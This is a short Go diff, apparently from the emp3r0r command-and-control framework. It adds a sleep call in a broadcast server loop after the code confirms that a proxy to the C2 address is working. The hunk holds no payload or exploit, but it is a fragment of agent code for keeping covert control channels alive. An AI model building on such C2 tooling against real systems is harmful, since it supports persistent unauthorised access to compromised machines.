@@ -62,6 +62,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			if RuntimeConfig.C2TransportProxy != "" {
 				if tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress) {
 					log.Printf("BroadcastServer: proxy '%s' is already working", RuntimeConfig.C2TransportProxy)
+					util.TakeASnap()
 					continue
 				}
 			}
